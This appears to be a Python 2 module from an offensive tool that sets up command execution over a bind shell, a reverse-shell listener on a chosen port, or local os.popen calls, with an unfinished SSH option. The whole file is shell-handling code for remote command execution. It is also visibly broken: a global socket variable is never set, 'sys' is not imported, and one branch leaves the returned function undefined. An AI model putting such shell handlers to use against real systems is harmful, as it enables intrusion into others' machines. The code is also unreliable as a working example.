import socket
import paramiko
import os


client = None
def runSocketCommand( comm ) :
	client.send( ' ' + comm + '\n')
	return client.recv(4096*2)

def runLocalhostCommand( comm ) :
	return os.popen( " " + comm + " 2>&1" ).read()




def get_command_execute ( args ) :
	if args.command == "bind" :
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		address = (args.IP, args.port )
		client.connect( address )
		runCommand = runSocketCommand


	elif args.command == "reverse" :
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server.bind( ("0.0.0.0", args.port ) )
		print "Waiting for the Reverse Shell at port %d" % args.port
		try :
			server.listen(5)
		except KeyboardInterrupt :
			print "Aborted by user..."
			sys.exit(-2)
		client, address = server.accept()
		runCommand = runSocketCommand


	elif args.command == "local" :
		runCommand = runLocalhostCommand


	elif args.command == "ssh" :
		pass

	return runCommand